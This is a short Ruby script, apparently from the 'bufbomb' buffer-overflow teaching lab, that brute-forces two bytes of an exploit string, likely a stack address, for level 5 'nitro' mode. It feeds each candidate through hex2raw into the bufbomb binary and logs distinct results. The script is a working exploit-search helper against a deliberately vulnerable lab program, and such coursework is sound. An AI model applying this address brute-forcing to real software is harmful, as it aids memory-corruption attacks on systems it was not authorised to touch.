#!/usr/bin/ruby
f = File.open('5_nitro.txt')
s = f.read
f.close


oa = s.split

hex = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
hex1 = ['a','b','c','d','e','f']

h = {}
#i = 0
hex1.each do |h1|

	hex1.each do |h2|

		hex.each do |h3|

			hex.each do |h4|
				t = oa.dup
				t[-11] = h1 + h2
				t[-12] = h3 + h4

				fo = File.open('test.txt','w')
				fo.write(t.join(' '))
				fo.close

				r = `cat test.txt | ./hex2raw -n | ./bufbomb -n -u pthiha:lxin`

				puts t[-11] + ' ' + t[-12]
				unless h.has_key?(r)
					fr = File.open('result.txt', 'a')
					h[r] = 1
					puts 'found*********************************'
					puts r
					fr.puts(t[-11] + ' ' + t[-12])
					fr.puts r
					fr.puts "\n**********"
					fr.flush
					#exit(1)
				end
#				puts r
#				i += 1
#				exit(1) if i == 3
			end
		end
	end
end


